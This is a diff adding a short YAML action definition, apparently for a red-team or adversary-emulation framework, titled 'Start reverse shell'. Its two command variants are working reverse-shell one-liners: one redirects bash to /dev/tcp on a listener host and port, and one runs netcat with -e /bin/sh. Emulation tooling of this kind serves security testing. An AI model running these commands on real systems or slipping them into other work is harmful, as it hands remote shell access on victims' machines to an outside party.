@@ -1,0 +1,21 @@
+name: Start reverse shell
+description: Establish a reverse shell
+tactic: Execution
+techniques: [""]
+args:
+  SRC_BIN: "implant"
+  DST_BIN: "/tmp/pause"
+# command: "StartListener"
+# effects: ["ListenerReady"]
+cmdVariants:
+  - key: "curl"
+    Command: bash -c "bash >& /dev/tcp/${LISTENER}/${LISTENER_PORT} 0>&1 &"
+  - key: "nc"
+    Command: bash -c "nc ${LISTENER} ${LISTENER_PORT} -e /bin/sh &"
+preconditions:
+  accessLevel: user-exec
+  exists:
+    - Listener
+# cmd: {}
+# defend: {}
+# refernces:
